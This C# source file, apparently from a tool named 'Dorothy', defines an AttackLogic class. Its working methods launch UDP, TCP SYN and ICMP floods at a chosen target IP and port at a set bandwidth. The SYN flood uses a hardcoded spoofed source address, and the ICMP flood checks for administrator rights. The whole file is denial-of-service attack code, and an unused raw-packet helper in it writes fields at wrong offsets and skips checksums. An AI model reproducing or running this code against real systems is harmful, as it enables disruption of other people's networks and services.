using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using System.Diagnostics; // Added for Stopwatch
using System.Security.Principal; // Added for WindowsIdentity and WindowsPrincipal
using SharpPcap;
using PacketDotNet;

namespace Dorothy
{
    public class AttackLogic
    {
        private volatile bool _stopAttack = false;

        // Method to start the UDP flood
        public Task StartUdpFlood(string targetIp, int targetPort, int mbps, Action<string> log)
        {
            _stopAttack = false;
            log($"Debug: Entering StartUdpFlood method");
            return Task.Run(async () =>
            {
                try
                {
                    log($"Debug: Creating UdpClient");
                    using (UdpClient udpClient = new UdpClient())
                    {
                        IPEndPoint targetEndpoint = new IPEndPoint(IPAddress.Parse(targetIp), targetPort);
                        log($"Debug: Target endpoint created: {targetEndpoint}");

                        byte[] buffer = new byte[1024]; // 1KB packet size
                        new Random().NextBytes(buffer); // Fill buffer with random data
                        log($"Debug: Buffer created with size: {buffer.Length}");

                        long packetsSent = 0;
                        long bytesPerSecond = mbps * 125000L; // Convert Mbps to bytes per second
                        long bytesSent = 0;
                        DateTime startTime = DateTime.Now;

                        log($"Debug: UDP Flood initialized. Target: {targetEndpoint}, BytesPerSecond: {bytesPerSecond}");

                        while (!_stopAttack)
                        {
                            udpClient.Send(buffer, buffer.Length, targetEndpoint);
                            bytesSent += buffer.Length;
                            packetsSent++;

                            if (packetsSent % 1000 == 0) // Log every 1000 packets
                            {
                                log($"Debug: UDP Flood: {packetsSent} packets sent");
                            }

                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
                            {
                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
                                log($"Debug: UDP Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");

                                startTime = DateTime.Now;
                                bytesSent = 0;
                                packetsSent = 0;

                                if (actualMbps > mbps)
                                {
                                    log($"Debug: Rate exceeded, sleeping for 10ms");
                                    Thread.Sleep(10);
                                }
                            }

                            // Calculate the delay needed to match the desired Mbps
                            double delay = (buffer.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
                            await Task.Delay((int)delay);
                        }
                    }
                }
                catch (Exception ex)
                {
                    log($"Debug: UDP Flood error: {ex.Message}");
                    log($"Debug: Stack trace: {ex.StackTrace}");
                }
                finally
                {
                    log("Debug: UDP Flood attack stopped.");
                }
            });
        }

        // Method to start the TCP SYN flood
        public Task StartTcpSynFlood(string targetIp, int targetPort, int mbps, Action<string> log)
        {
            _stopAttack = false;
            log($"Debug: Entering StartTcpSynFlood method");

            return Task.Run(() =>
            {
                try
                {
                    log($"Debug: Using SharpPcap for TCP SYN flood");

                    var devices = SharpPcap.LibPcap.LibPcapLiveDeviceList.Instance;
                    if (devices.Count() < 1)
                    {
                        log("Error: No devices were found on this machine");
                        return;
                    }

                    var device = devices[0];
                    if (device == null)
                    {
                        log("Error: Unable to select a network device");
                        return;
                    }

                    device.Open(SharpPcap.DeviceModes.Promiscuous, 1000);

                    var srcIp = IPAddress.Parse("192.168.1.1");
                    var dstIp = IPAddress.Parse(targetIp);
                    var srcPort = 12345;

                    long packetsSent = 0;
                    long bytesPerSecond = mbps * 125000L;
                    long bytesSent = 0;
                    DateTime startTime = DateTime.Now;

                    log($"Debug: TCP SYN Flood initialized. Target: {targetIp}:{targetPort}, BytesPerSecond: {bytesPerSecond}");

                    while (!_stopAttack)
                    {
                        try
                        {
                            EthernetPacket ethernetPacket = new EthernetPacket(device.MacAddress, PhysicalAddress.Parse("FF:FF:FF:FF:FF:FF"), EthernetType.IPv4);
                            if (ethernetPacket == null)
                            {
                                log("Error: Failed to create Ethernet packet");
                                continue;
                            }

                            IPv4Packet ipPacket = new IPv4Packet(srcIp, dstIp)
                            {
                                TimeToLive = 64,
                                Protocol = PacketDotNet.ProtocolType.Tcp
                            };
                            if (ipPacket == null)
                            {
                                log("Error: Failed to create IP packet");
                                continue;
                            }

                            TcpPacket tcpPacket = new TcpPacket((ushort)srcPort, (ushort)targetPort)
                            {
                                SequenceNumber = 100,
                                WindowSize = 8192
                            };
                            if (tcpPacket == null)
                            {
                                log("Error: Failed to create TCP packet");
                                continue;
                            }

                            tcpPacket.Flags = 0x02;

                            ipPacket.PayloadPacket = tcpPacket;
                            ethernetPacket.PayloadPacket = ipPacket;

                            device.SendPacket(ethernetPacket);

                            packetsSent++;
                            bytesSent += ethernetPacket.Bytes.Length;

                            if (packetsSent % 1000 == 0) // Log every 1000 packets
                            {
                                log($"Debug: TCP SYN Flood: {packetsSent} packets sent");
                            }

                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
                            {
                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
                                log($"Debug: TCP SYN Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");

                                startTime = DateTime.Now;
                                bytesSent = 0;
                                packetsSent = 0;

                                if (actualMbps > mbps)
                                {
                                    log($"Debug: Rate exceeded, sleeping for 10ms");
                                    Thread.Sleep(10);
                                }
                            }

                            // Calculate the delay needed to match the desired Mbps
                            double delay = (ethernetPacket.Bytes.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
                            Thread.Sleep((int)delay);
                        }
                        catch (Exception ex)
                        {
                            log($"TCP SYN Flood error: {ex.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    log($"TCP SYN Flood error: {ex.Message}");
                }
                finally
                {
                    log("Debug: TCP SYN Flood attack stopped.");
                }
            });
        }

        private void ConstructTcpSynPacket(byte[] buffer, string targetIp, int targetPort)
        {
            // Fill the buffer with a minimal TCP SYN packet
            // This is a simplified example and may need to be adjusted for actual use
            Array.Clear(buffer, 0, buffer.Length);

            // Set IP header fields (simplified)
            buffer[0] = 0x45; // Version and header length
            buffer[2] = (byte)((buffer.Length >> 8) & 0xFF); // Total length
            buffer[3] = (byte)(buffer.Length & 0xFF);
            buffer[8] = 64; // TTL
            buffer[9] = (byte)PacketDotNet.ProtocolType.Tcp; // Protocol

            // Set TCP header fields (simplified)
            buffer[20] = (byte)((targetPort >> 8) & 0xFF); // Destination port
            buffer[21] = (byte)(targetPort & 0xFF);
            buffer[13] = 0x02; // SYN flag

            // Set source and destination IP addresses
            byte[] srcIp = { 192, 168, 1, 1 }; // Example source IP
            byte[] dstIp = IPAddress.Parse(targetIp).GetAddressBytes();
            Array.Copy(srcIp, 0, buffer, 12, 4);
            Array.Copy(dstIp, 0, buffer, 16, 4);

            // Calculate and set IP and TCP checksums (omitted for brevity)
        }

        // Method to start the ICMP flood
        public Task StartIcmpFlood(string targetIp, int mbps, Action<string> log)
        {
            _stopAttack = false;
            log($"Debug: Entering StartIcmpFlood method");

            // Check if the application is running with elevated privileges
            if (!IsRunningAsAdmin())
            {
                log("Error: ICMP Flood requires administrative privileges. Please run the application as an administrator.");
                return Task.CompletedTask;
            }

            return Task.Run(() =>
            {
                try
                {
                    log($"Debug: Creating raw socket for ICMP");
                    using (Socket icmpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.Icmp))
                    {
                        IPEndPoint targetEndpoint = new IPEndPoint(IPAddress.Parse(targetIp), 0);
                        byte[] buffer = new byte[1024]; // 1KB packet size
                        new Random().NextBytes(buffer); // Fill buffer with random data
                        log($"Debug: Buffer created with size: {buffer.Length}");

                        long packetsSent = 0;
                        long bytesPerSecond = mbps * 125000L; // Convert Mbps to bytes per second
                        long bytesSent = 0;
                        DateTime startTime = DateTime.Now;

                        log($"Debug: ICMP Flood initialized. Target: {targetIp}, BytesPerSecond: {bytesPerSecond}");

                        while (!_stopAttack)
                        {
                            try
                            {
                                icmpSocket.SendTo(buffer, targetEndpoint);
                                packetsSent++;
                                bytesSent += buffer.Length;
                            }
                            catch (SocketException ex)
                            {
                                log($"ICMP Flood error: {ex.Message}");
                            }

                            if (packetsSent % 1000 == 0) // Log every 1000 packets
                            {
                                log($"Debug: ICMP Flood: {packetsSent} packets sent");
                            }

                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
                            {
                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
                                log($"Debug: ICMP Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");

                                startTime = DateTime.Now;
                                bytesSent = 0;
                                packetsSent = 0;

                                if (actualMbps > mbps)
                                {
                                    log($"Debug: Rate exceeded, sleeping for 10ms");
                                    Thread.Sleep(10);
                                }
                            }

                            // Calculate the delay needed to match the desired Mbps
                            double delay = (buffer.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
                            Thread.Sleep((int)delay);
                        }
                    }
                }
                catch (Exception ex)
                {
                    log($"ICMP Flood error: {ex.Message}");
                }
                finally
                {
                    log("Debug: ICMP Flood attack stopped.");
                }
            });
        }

        // Method to stop the attack
        public void StopAttack()
        {
            _stopAttack = true;
        }

        private bool IsRunningAsAdmin()
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
    }
}